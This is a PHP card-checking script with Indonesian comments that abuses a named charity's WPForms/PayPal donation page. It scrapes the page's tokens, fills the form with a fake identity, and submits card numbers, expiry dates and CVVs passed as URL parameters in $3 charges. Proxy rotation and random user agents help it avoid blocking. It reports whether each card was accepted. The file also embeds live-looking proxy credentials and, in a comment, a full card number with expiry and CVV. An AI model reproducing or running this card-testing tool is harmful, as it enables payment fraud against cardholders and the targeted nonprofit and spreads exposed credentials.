<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set('html_errors', 1);
error_reporting(E_ALL);


include "randuser.php";
$randuser = random_user_agent();

$sessionid = random_int(23935, 99825);

$PROXY_HOST = 'brd.superproxy.io:33335';
$PROXY_USER = 'brd-customer-hl_11e62775-zone-isp_proxy1-session-alapadin' . $sessionid;
$PROXY_PASS = 'p7xywu7ftcr9';

$cookie_file = 'cookie.txt';


$globalConfig = [
    'proxy_host'  => $PROXY_HOST,
    'proxy_auth'  => $PROXY_USER . ':' . $PROXY_PASS,
    'cookie_file' => $cookie_file,
];


function cek_ip($randuser, $config) {
    $ch = curl_init('https://api.ipify.org');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERAGENT      => $randuser,
    ]);
    set_standard_curl_opts($ch, $config);
    $ip = curl_exec($ch);
    curl_close($ch);
    return trim($ip);
}

function set_standard_curl_opts($ch, $config) {
    curl_setopt($ch, CURLOPT_PROXY, $config['proxy_host']);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $config['proxy_auth']);
    // Menggunakan file cookie yang sama untuk membaca dan menyimpan
    curl_setopt($ch, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $config['cookie_file']);
}


function ambildata($randuser, $config) {
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, "https://gijf.org/donate/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Lewati verifikasi SSL jika diperlukan
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    // User Agent sangat penting agar tidak diblokir server
    curl_setopt($ch, CURLOPT_USERAGENT, $randuser);
    set_standard_curl_opts($ch, $config);

    $html = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200 || !$html) {
        return false;
    }

    $results = [
        'nonce_create'  => null,
        'page_id'       => null,
        'wpforms_id'    => null,
        'client_token'  => null,
        'token'         => null,
    ];

    // Regex untuk masing-masing target
    $patterns = [
        'nonce_create' => '/"nonces":\{"create":"([^"]+)"/',
        'page_id'      => '/name="page_id"\s+value="([^"]+)"/',
        'wpforms_id'   => '/name="wpforms\[id\]"\s+value="([^"]+)"/',
        'client_token' => '/data-client-token="([^"]+)"/',
        'token'        => '/data-token="([^"]+)"/',
    ];

    foreach ($patterns as $key => $pattern) {
        if (preg_match($pattern, $html, $matches)) {
            $results[$key] = $matches[1];
        }
    }

    return $results;
}


function get_random_user_data($randuser)
{
    // Menggunakan nat=us agar sesuai dengan proxy US
    $apiUrl = 'https://fake-json-api.mock.beeceptor.com/users/1'; 
    $ch = curl_init($apiUrl);
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => ['User-Agent: ' . $randuser],
        // SSL Verify false untuk mempercepat/testing
        CURLOPT_SSL_VERIFYPEER => false, 
    ]);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return ['error' => 'Gagal menghubungi API beeceptor: ' . curl_error($ch)];
    }
    curl_close($ch);

    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        return ['error' => 'Gagal memproses data JSON dari beeceptor.'];
    }

    $user = $data;
    return [
        'first_name' => $user['name'],
        'email'      => $user['email'],
        'phone'      => '7586948576',
        'address1'   => $user['address'],
        'state'      => $user['state'],
        'postal_code'=> $user['zip'],
    ];
}


function tahap1($randuser, $fn, $eml, $add, $stt, $zip, $formid, $page_id, $nonce_create, $config) 
{
    $url = 'https://gijf.org/wp-admin/admin-ajax.php?action=wpforms_paypal_commerce_create_order';
    
    $data = [
        // Nama
        'wpforms[fields][1][first]' => $fn,
        'wpforms[fields][1][last]'  => $fn,
    
        // Empty fields
        'wpforms[fields][6]' => '',
        'wpforms[fields][7]' => '',
    
        // Amount
        'wpforms[fields][2]' => '3.00',
    
        // Email
        'wpforms[fields][3]' => $eml,
    
        // Address
        'wpforms[fields][8][address1]' => $add,
        'wpforms[fields][8][address2]' => '',
        'wpforms[fields][8][city]'     => $stt,
        'wpforms[fields][8][state]'    => 'AK',
        'wpforms[fields][8][postal]'   => $zip,
    
        // Temp & empty
        'wpf-temp-wpforms[fields][9]' => '',
        'wpforms[fields][9]'          => '',
        'wpforms[fields][5]'          => '',
    
        // PayPal meta
        'wpforms[fields][10][orderID]'        => '',
        'wpforms[fields][10][subscriptionID]' => '',
        'wpforms[fields][10][source]'          => '',
        'wpforms[fields][10][cardname]'        => $fn,
    
        // Form meta
        'wpforms[id]'      => $formid,
        'page_title'       => 'Donate',
        'page_url'         => 'https://gijf.org/donate/',
        'url_referer'      => 'https://www.google.com/',
        'page_id'          => $page_id,
        'wpforms[post_id]' => $page_id,
    
        // Total & flags
        'total'       => '3',
        'is_checkout' => 'false',
    
        // Nonce
        'nonce' => $nonce_create,
    ];
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: '.$randuser,
            'Accept: */*',
            'Referer: https://gijf.org/donate/',
            'Origin: https://gijf.org',
        ],
    ]);
    
    set_standard_curl_opts($ch, $config);
    
    $response = curl_exec($ch);
    if ($response === false) {
        die('cURL ERROR: ' . curl_error($ch));
    }
    
    curl_close($ch);
    
    return $response;
    
}

function tahap2($id, $token, $fn, $cc, $exp, $cvv)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://cors.api.paypal.com/v2/checkout/orders/'.$id.'/confirm-payment-source');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
        'Accept: */*',
        'Content-Type: application/json',
        'Authorization: Bearer '.$token,
        'Braintree-SDK-Version: 3.32.0-payments-sdk-dev',
        'PayPal-Client-Metadata-Id: 4b70aa52f5c873ac12a93e9c7f28ddaa',
        'Origin: https://assets.braintreegateway.com',
        'Connection: keep-alive',
        'Referer: https://assets.braintreegateway.com/',
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_source":{"card":{"number":"'.$cc.'","expiry":"'.$exp.'","security_code":"'.$cvv.'","name":"'.$fn.'","attributes":{"verification":{"method":"SCA_WHEN_REQUIRED"}}}},"application_context":{"vault":false}}');
    
    //set_standard_curl_opts($ch, $config);
    
    $response = curl_exec($ch);
    if ($response === false) {
        die('cURL ERROR: ' . curl_error($ch));
    }
    curl_close($ch);
    return $response;
}

function tahap3($fn, $eml, $add, $stt, $zip, $id, $formid, $page_id, $token, $config)
{
    $url = 'https://gijf.org/wp-admin/admin-ajax.php';
    
    $data = [
        'wpforms[fields][1][first]' => $fn,
        'wpforms[fields][1][last]'  => $fn,
        'wpforms[fields][6]'        => '',
        'wpforms[fields][7]'        => '',
        'wpforms[fields][2]'        => '3.00',
        'wpforms[fields][3]'        => $eml,
    
        'wpforms[fields][8][address1]' => $add,
        'wpforms[fields][8][address2]' => '',
        'wpforms[fields][8][city]'     => $stt,
        'wpforms[fields][8][state]'    => 'AK',
        'wpforms[fields][8][postal]'   => $zip,
    
        'wpforms[fields][9]' => '',
        'wpforms[fields][5]' => '',
    
        'wpforms[fields][10][orderID]'        => $id,
        'wpforms[fields][10][subscriptionID]' => '',
        'wpforms[fields][10][source]'          => '',
        'wpforms[fields][10][cardname]'        => $fn,
    
        'wpforms[id]'      => $formid,
        'page_title'       => 'Donate',
        'page_url'         => 'https://gijf.org/donate/',
        'url_referer'      => 'https://www.google.com/',
        'page_id'          => $page_id,
        'wpforms[post_id]' => $page_id,
    
        'wpforms[token]'   => $token,
        'action'           => 'wpforms_submit',
    
        'start_timestamp'  => time(),
        'end_timestamp'    => time() + 41,
    ];

    $ch = curl_init($url);

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $data, // multipart otomatis
        CURLOPT_HTTPHEADER     => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
            'Accept: application/json, text/javascript, */*; q=0.01',
            'X-Requested-With: XMLHttpRequest',
            'Referer: https://gijf.org/donate/',
            'Origin: https://gijf.org',
        ],
    ]);
    
    set_standard_curl_opts($ch, $config);
    
    $response = curl_exec($ch);

    return $response;
}

$profil = get_random_user_data($randuser);
$data = ambildata($randuser, $globalConfig);

///////////////////////////
$fn = $profil['first_name'];
$eml = $profil['email'];
$add = $profil['address1'];
$phone = $profil['phone'];
$stt = $profil['state'];
$zip = $profil['postal_code'];

////////////////////////////////
$formid = $data["wpforms_id"];
$nonce_create = $data["nonce_create"];
$page_id = $data["page_id"];
$client_token = json_decode(base64_decode($data["client_token"]), true);
$client_token1 = $client_token["paypal"]["accessToken"];
$token = $data["token"];

$tahap1 = json_decode(tahap1($randuser, $fn, $eml, $add, $stt, $zip, $formid, $page_id, $nonce_create, $globalConfig), true);

//var_dump($tahap1);
$tahap1_id = $tahap1["data"]["id"];
$cc = $_GET["cc"];
$exp = $_GET["exp"];
$cvv = $_GET["cvv"];

//372503112003002|05|2028|7696

$hasil_tahap2 = tahap2($tahap1_id, $client_token1, $fn, $cc, $exp, $cvv);
$id2 = json_decode($hasil_tahap2, true);

$tahap3 = tahap3($fn, $eml, $add, $stt, $zip, $id2["id"], $formid, $page_id, $token, $globalConfig);

if (preg_match("#Thanks for your donation! We will be in touch with you shortly.#", $tahap3)) {
    echo "Sukses";
} elseif (preg_match("#This payment cannot be processed because it was declined by payment processor.#", $tahap3)) {
    echo "Gagal";
} else {
    var_dump($tahap3);
}

unlink($cookie_file);
